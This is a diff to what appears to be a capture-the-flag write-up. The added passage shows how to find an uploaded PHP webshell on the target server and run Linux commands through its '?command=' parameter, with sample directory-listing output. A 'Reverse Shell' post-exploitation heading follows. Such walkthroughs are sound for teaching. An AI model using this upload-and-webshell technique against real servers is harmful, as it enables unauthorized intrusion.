@@ -211,7 +211,18 @@ After login we only see the file upload feature in it, since the website using `
 Other reference Malicious Code:
 - https://github.com/bayufedra/Tiny-PHP-Webshell
 
-After submit it, web will giving response `Book inserted successfully!`
+After submit it, web will giving response `Book inserted successfully!`. but where this file is uploaded? as we remember the port `80` website shown some of table data, and yes we can know where the file is located from there by clicking on `View Details` first and on broken picture try to click right-click on it and choice `Open image in new tab`. We will see page with content like below
+```
+Warning: system(): Cannot execute a blank command in /var/www/html/administrator/uploads/e77a53f1b6b4aba6d1fc86e42767ce4c.php on line 1
+```
+Since server is linux based, now we can execute linux command in server with adding `?command=<linux-command>`. for example `?command=ls -lah` and we will get
+```
+total 16K
+drwxrwxrwx 1 www-data www-data 4.0K Mar  7 15:32 .
+drwxrwxr-x 1 root     root     4.0K Feb 27 14:40 ..
+-rw-r--r-- 1 www-data www-data   34 Mar  7 15:32 e77a53f1b6b4aba6d1fc86e42767ce4c.php
+-rwxrwxrwx 1 www-data www-data    0 Feb 27 14:40 index.php
+```
 
 # Post-Exploitation
 ### Reverse Shell
